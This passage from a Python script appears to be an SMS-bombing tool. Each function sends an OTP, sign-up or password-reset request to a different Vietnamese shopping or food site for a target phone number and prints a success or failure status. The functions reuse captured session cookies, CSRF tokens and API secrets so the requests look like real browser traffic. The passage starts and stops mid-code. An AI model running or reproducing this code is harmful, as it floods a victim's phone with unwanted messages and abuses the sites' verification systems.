        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'dispatch': 'tat_commons.verifi_phone',
    }

    data = {
        'phone': sdt,
        'skip_noti': 'true',
        'security_hash': '5751fb15de53985c76fe604de779432e',
        'is_ajax': '1',
    }

    try:
        response = requests.post('https://www.tatmart.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TATMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TATMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mrtho():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.mrtho.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.mrtho.vn/customer/signin',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    try:
        response = requests.post('https://www.mrtho.vn/api/sms/sendsms', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MRTHO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MRTHO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dominos():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dmn': 'CSPLDV',
        'origin': 'https://dominos.vn',
        'priority': 'u=1, i',
        'referer': 'https://dominos.vn/promotion-listing/giam-70-pizza-thu-2?utm_source=IDAC-SEM&utm_medium=cpa&utm_campaign=WDS70&utm_content=Brand-Domino&gad_source=1',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'email': 'fajpfjasfa2@gmail.com',
        'type': 0,
        'is_register': True,
    }

    try:
        response = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DOMINOS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DOMINOS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def picoregister():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://pico.vn',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'name': 'Tran Quang Trinh',
        'phone': sdt,
        'provinceCode': '92',
        'districtCode': '926',
        'wardCode': '31303',
        'address': '53 et 3',
    }

    try:
        response = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PICO REGISTER | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PICO REGISTER | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pico():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'access': '206f5b6838b4e357e98bf68dbb8cdea5',
        'channel': 'b2c',
        'content-type': 'application/json',
        'origin': 'https://pico.vn',
        'party': 'ecom',
        'platform': 'Desktop',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'uuid': 'e0d012899e3d4e78baa521ade9f4689c',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PICO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PICO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hacom():
    cookies = {
        'fcb677da6e48f7e29e4e541120b3608f': 'u9qe3f8u2a9jj060f3tu4mitg2',
        'uID': 'tXp8lmM9XXHFe5J1PcUe',
        '__session:0.6773658427370488:': 'https:',
        'shopping_cart_store': 'LQ==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'fcb677da6e48f7e29e4e541120b3608f=u9qe3f8u2a9jj060f3tu4mitg2; uID=tXp8lmM9XXHFe5J1PcUe; __session:0.6773658427370488:=https:; shopping_cart_store=LQ==',
        'origin': 'https://hacom.vn',
        'priority': 'u=1, i',
        'referer': 'https://hacom.vn/linh-kien-may-tinh',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'user',
        'action_type': 'send-mobile-login-code',
        'mobile': sdt,
    }

    try:
        response = requests.post('https://hacom.vn/ajax/post.php', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HACOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HACOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def liena():
    cookies = {
        'PHPSESSID': '997f7ef87dd4e136f3ef400840a92c30',
        'form_key': 'swQ82ROkN21LcWPb',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'form_key': 'swQ82ROkN21LcWPb',
        'section_data_ids': '{%22messages%22:1721974277}',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'PHPSESSID=997f7ef87dd4e136f3ef400840a92c30; form_key=swQ82ROkN21LcWPb; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=swQ82ROkN21LcWPb; section_data_ids={%22messages%22:1721974277}',
        'origin': 'https://www.liena.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.liena.com.vn/nem?gad_source=1&gclid=CjwKCAjw74e1BhBnEiwAbqOAjJSvIthYojNKr-9nQRVTh9YiSHoTsS-xuB5mPy5nx73wqUScyaTXAhoCA0AQAvD_BwE',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
    }

    try:
        response = requests.post(
            'https://www.liena.com.vn/rest/V1/liena/customer/login/request-otp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LIENA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LIENA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gofood():
    cookies = {
        'ci_session': '1da3rhie59qq8r85pa5vt7arqg5gt4oo',
        'csrf_cookie_name': '300aa3e9b94c3b8b5404ae0e713dd834',
        'area_code': 'HN',
        'isChooseArea': '1',
        'popup_time': '1',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'ci_session=1da3rhie59qq8r85pa5vt7arqg5gt4oo; csrf_cookie_name=300aa3e9b94c3b8b5404ae0e713dd834; area_code=HN; isChooseArea=1; popup_time=1; G_ENABLED_IDPS=google',
        'origin': 'https://gofood.vn',
        'priority': 'u=0, i',
        'referer': 'https://gofood.vn/dang-nhap',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://gofood.vn/dang-nhap', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pasgo():
    cookies = {
        'CHECK_COOKIES': '1',
        'MESSAGE_UNREAD': 'NaN',
        'PASGOID': '',
        '__RequestVerificationToken': 'lQ-nalLi-ZKbGr-kL_pNhY-4ZViMskpa5trJotI1HyNg866AKdvrhAUfhc1IcvhX4KBnEuO9XL6vVhxHoDtM_duUjY_QmJF_VPbWZDKNsec1',
        'ASP.NET_SessionId': '2rfy0ruzurubkff324um1u0z',
        'PROVINCE_ID_COOKIES': '2',
        'PROVINCE_NAME_COOKIES': 'H%e1%bb%93+Ch%c3%ad+Minh',
        'PROVINCE_ALIAS_COOKIES': 'ho-chi-minh',
        'viteexConfig': '%7B%22app_id%22%3A%22DnZ4G2DeWz%22%2C%22app_domain%22%3A%22https%3A//pasgo.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3Anull%2C%22not_ask_allow_in_day%22%3A0%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'ls-user-name': 'Guest-FDDB-38399687',
        'mp_sid': '1721975642612.2136',
        'CONFIRM_SMS_COOKIES': f'%7b%22Imei%22%3a%22171.224.178.63%22%2c%22MaQuocGia%22%3a%22%2b84%22%2c%22Sdt%22%3a%22%2b{sdt}%22%2c%22MaKichHoat%22%3anull%2c%22MatKhau%22%3a%22f5bb0c8de146c67b44babbf4e6584cc0%22%2c%22MaNguoiGioiThieu%22%3a%22123456%22%2c%22TinhId%22%3a2%2c%22TenNguoiDung%22%3a%22quoc+trnh+tran%22%2c%22Email%22%3anull%2c%22GioiTinh%22%3atrue%2c%22ReturnUrl%22%3a%22%2fkich-hoat%22%2c%22IsRegister%22%3atrue%2c%22TypeToken%22%3a0%2c%22Token%22%3a%22%22%2c%22Birth%22%3a%22%22%2c%22SocialId%22%3a%22%22%7d',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Referer': 'https://pasgo.vn/dang-ky?returnUrl=%2Fkich-hoat',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.get('https://pasgo.vn/kich-hoat', cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PASGO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PASGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def coolmatereset():
    cookies = {
        'device_token': '597f946e29e835d88f56392f40ea75c3',
        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
        'cart_quantity': '0',
        'active-voucher1': 'true',
        'g_state': '{"i_p":1725246086128,"i_l":4}',
        'affiliate_content': '%7B%22time_stamp%22%3A1723196856%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fsan-pham-moi%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.166%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjw_Na1BhAlEiwAM-dm7DYmMVm6OHcCbFOvr-RFQgBrgvAymOlXYufY0hlchR_ukvKc2ePdXxoCzskQAvD_BwE%22%7D',
        'redirect_url': 'eyJpdiI6ImtRZHYxdzd3Qm45N29NNjNnMlN0dXc9PSIsInZhbHVlIjoiQVNJVEpWcHp2eWQxbGZnSmo2K3ZPbGYxUCttMXNMVURYQzc0YlpHeWNYZFcwMExoQldXazhYZjY0MHc3N0ZBUzFHTTVmdThyMGVoSzNDZ1wvWWRHSVJ3K0JqQU5Ha0h4Z0F4ZkhRdXBqeWxWN0R5MnpTXC9RZU4yN2QzWUlkaWZXXC9kZUdzcXZXcGl6WUNZcWVod2p1dUNxdlVUVlhROHJFaXB0MFFPc1wvVjRHbmVsRGhrSHM1OHhKYVNXRWJ6SFFUOHI0WHpqeHJCMDEyK1hJVXpCaVRiKzVTODRSQTNGTm5LMUlvbEJkMGR4ZjdFZmhTVTBmVXdoRnBza3ZycnNjVWZrTVhidjg3K1grVjJxKytZYzFcL0ZXUU9GM1p6UUt3cTZoTUg0ZURMV3dlS25YR0YrQnR5QVhBNVpsdEY2Wjdwb29mWmw0SlwvUkZTNEFxbFZ0TGZURHl5SzM0eFBHQUhQVmxSUGRzR0hqaWdJPSIsIm1hYyI6IjUxYjEzNDViZmJjNjQ4ZjQ2ZWVlNzUxMTgzZjdlZmRkMzkwMWMzNTVmYjNjNmFlOGM3Y2MzMDFhMjY2NDJhNzkifQ%3D%3D',
        'XSRF-TOKEN': 'eyJpdiI6IlZtNlhTYTRPeTQ0ZUpJajVEajl5V3c9PSIsInZhbHVlIjoiTlMxckF3Y0JDYjc2cXNwcysybUNuQ1VZaEVFNG1XTG9MRUtUTjdJbmpFdGFrdlYxUXdYbnI5TU9MdlhsV2tWdyIsIm1hYyI6Ijg3YmJjNjRlNDg4NDBkMmI5ODEyNDRhNzlhMjZmNGY3MDJiOTBlMTM0MGM1ZWQyNzI2YjE5NDdjMDg4ZjJjNWQifQ%3D%3D',
        'laravel_session': 'eyJpdiI6IkpGYXQ5elljYUw2ZlJMTldRQVJjWHc9PSIsInZhbHVlIjoiTDhLM0JnbzBQTExMcmhZcWMrY050ZmxsRjRcL2xBM2k1SGsrMytxSVYxNkRlT2I1MUFLQ1pObkpoMWthVzNSb0YiLCJtYWMiOiIwOGU2YmY1ZjI1ZDZkZDViMjA0ZjE2Njc1YmIzYTM3ZjkxMTM1YTNmOTE2NDZiZTExODAwMjQ2YmQzMmEwY2UxIn0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1725246086128,"i_l":4}; affiliate_content=%7B%22time_stamp%22%3A1723196856%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fsan-pham-moi%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.166%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjw_Na1BhAlEiwAM-dm7DYmMVm6OHcCbFOvr-RFQgBrgvAymOlXYufY0hlchR_ukvKc2ePdXxoCzskQAvD_BwE%22%7D; redirect_url=eyJpdiI6ImtRZHYxdzd3Qm45N29NNjNnMlN0dXc9PSIsInZhbHVlIjoiQVNJVEpWcHp2eWQxbGZnSmo2K3ZPbGYxUCttMXNMVURYQzc0YlpHeWNYZFcwMExoQldXazhYZjY0MHc3N0ZBUzFHTTVmdThyMGVoSzNDZ1wvWWRHSVJ3K0JqQU5Ha0h4Z0F4ZkhRdXBqeWxWN0R5MnpTXC9RZU4yN2QzWUlkaWZXXC9kZUdzcXZXcGl6WUNZcWVod2p1dUNxdlVUVlhROHJFaXB0MFFPc1wvVjRHbmVsRGhrSHM1OHhKYVNXRWJ6SFFUOHI0WHpqeHJCMDEyK1hJVXpCaVRiKzVTODRSQTNGTm5LMUlvbEJkMGR4ZjdFZmhTVTBmVXdoRnBza3ZycnNjVWZrTVhidjg3K1grVjJxKytZYzFcL0ZXUU9GM1p6UUt3cTZoTUg0ZURMV3dlS25YR0YrQnR5QVhBNVpsdEY2Wjdwb29mWmw0SlwvUkZTNEFxbFZ0TGZURHl5SzM0eFBHQUhQVmxSUGRzR0hqaWdJPSIsIm1hYyI6IjUxYjEzNDViZmJjNjQ4ZjQ2ZWVlNzUxMTgzZjdlZmRkMzkwMWMzNTVmYjNjNmFlOGM3Y2MzMDFhMjY2NDJhNzkifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IlZtNlhTYTRPeTQ0ZUpJajVEajl5V3c9PSIsInZhbHVlIjoiTlMxckF3Y0JDYjc2cXNwcysybUNuQ1VZaEVFNG1XTG9MRUtUTjdJbmpFdGFrdlYxUXdYbnI5TU9MdlhsV2tWdyIsIm1hYyI6Ijg3YmJjNjRlNDg4NDBkMmI5ODEyNDRhNzlhMjZmNGY3MDJiOTBlMTM0MGM1ZWQyNzI2YjE5NDdjMDg4ZjJjNWQifQ%3D%3D; laravel_session=eyJpdiI6IkpGYXQ5elljYUw2ZlJMTldRQVJjWHc9PSIsInZhbHVlIjoiTDhLM0JnbzBQTExMcmhZcWMrY050ZmxsRjRcL2xBM2k1SGsrMytxSVYxNkRlT2I1MUFLQ1pObkpoMWthVzNSb0YiLCJtYWMiOiIwOGU2YmY1ZjI1ZDZkZDViMjA0ZjE2Njc1YmIzYTM3ZjkxMTM1YTNmOTE2NDZiZTExODAwMjQ2YmQzMmEwY2UxIn0%3D',
        'origin': 'https://www.coolmate.me',
        'priority': 'u=1, i',
        'referer': 'https://www.coolmate.me/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'D7iqmZnnMxUtxKkXXepInRbiIubOm2TDB9ci70Y2',
    }

    json_data = {
        'address': sdt,
        'type': 'phone',
        'prev': '',
        'ajax': True,
    }

    try:
        response = requests.post('https://www.coolmate.me/account/forgotPassword', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("COOLMATERESET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("COOLMATERESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def coolmateresend():
    cookies = {
        'device_token': '597f946e29e835d88f56392f40ea75c3',
        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
        'cart_quantity': '0',
        'active-voucher1': 'true',
        'g_state': '{"i_p":1725246086128,"i_l":4}',
        'affiliate_content': '%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D',
        'XSRF-TOKEN': 'eyJpdiI6IjlyQjBOY1ZvT2VkQVVnQnVLUkFYSkE9PSIsInZhbHVlIjoiR0NuaHdkeTd5Z2tqTldFV2NDS1Bhc2tRV3E4N0ZTMEI1ZGt4RGxiTjVZZFRTMGhVd0ZWdUNRYzNcL0hnS2tld3oiLCJtYWMiOiI2NWFiNzBkZDQxMzc5NzhhNGQ3ODNhMWRiODI2YmNmMjUzNTQ4MjZiMmQ0MzhiNzBlYTI1YTI5YzQ3YjJhNGMwIn0%3D',
        'laravel_session': 'eyJpdiI6IkxYT0loN2tLSEpVeXRDVlZ2QVVpaUE9PSIsInZhbHVlIjoiMXZ0ZmtMbW5idVRGeUtoWmpJb3BMblVkK1dzM0VHK1N4aVlCQ0EzbUxRYko3TnlLUENCYkNQY2d2TkVzRDRRZCIsIm1hYyI6IjZjZGE3OWEyZmFjNDdjYzdiM2JiMWViZjNkMmRjMjA5YjUwZGMzNTA4NjZkNjcxMDA2OGEyNjBmODVjMTc3NTMifQ%3D%3D',
        'redirect_url': 'eyJpdiI6IkwxQmpzTjFLWFJkakpZczZvc2dobkE9PSIsInZhbHVlIjoiUWFjVWt0YlZzWE5yM1BBb2hBSHd2TDAwaVwvNVVEczcwc3dBRFdQdUJIUEljcjMyUXlEUEZMOWJRVTRJVlh3MHZjVTJoTkN1MzFSemhEcDUwSWtqNUozSk1yOE0wUjJNWVVmbzROOTFvaExIN2R3V2VWVzVyK3l2d004c2lBMG0rdVwvWWk0cFwvNkc1VlFOd05cLzRDUXZ3VkhmN2ZjRjFENGJqSHQ2ZDZuSnRnVUJMakpTV2xkcUFUZWVpV2IxUEhZcVhGbk1MQzFFK3k2RGhDR2tIMysrRDVVUmxnaVFnKzl2a2VLUU9kWmo4NEl4UFBoSUFNcDZYU05Vb1NuRFhmUkpxcEtDTEFBcWxxUFJYQ2RuMWNcL08xNk1hNFNLT2pXTHpFaytvcnFsakdqOD0iLCJtYWMiOiJhODgzNDY3NmRkZWJlYmM1MjYwNjQxZTA4ODY2Nzg1YWQ4ODc0MjIwZDdkMmIyMjUwMzliODA0ZDA5YTlkZGMxIn0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1725246086128,"i_l":4}; affiliate_content=%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D; XSRF-TOKEN=eyJpdiI6IjlyQjBOY1ZvT2VkQVVnQnVLUkFYSkE9PSIsInZhbHVlIjoiR0NuaHdkeTd5Z2tqTldFV2NDS1Bhc2tRV3E4N0ZTMEI1ZGt4RGxiTjVZZFRTMGhVd0ZWdUNRYzNcL0hnS2tld3oiLCJtYWMiOiI2NWFiNzBkZDQxMzc5NzhhNGQ3ODNhMWRiODI2YmNmMjUzNTQ4MjZiMmQ0MzhiNzBlYTI1YTI5YzQ3YjJhNGMwIn0%3D; 